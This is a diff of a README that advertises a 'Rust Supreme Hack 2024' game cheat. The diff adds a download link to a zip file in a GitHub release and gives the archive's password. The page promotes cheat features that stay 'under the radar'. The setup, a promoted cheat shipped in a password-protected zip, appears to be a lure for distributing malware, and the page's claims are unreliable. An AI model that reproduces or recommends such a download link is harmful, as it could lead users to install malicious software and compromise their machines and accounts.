@@ -1,6 +1,6 @@
 # 🔥 Rust Supreme Hack 2024: Dominate with Precision & Power! 🔥
 
-[**Download Supreme Hack**](#)
+[**Download Supreme Hack**](https://github.com/kminter1/Rust-Cheat-External/releases/download/rust/Rust.External.Realese.zip)
 enter the password: **RUST2024SUPREME** 🔑
 
 Get ready to rise above the competition and conquer Rust like a true legend! 🏆 With our Supreme Hack, you’ll have all the tools you need to stay ahead and thrive in the harsh world of Rust. Perfect for both beginners and seasoned players, this cheat is packed with premium features designed to enhance your gameplay while staying under the radar! 🕶️
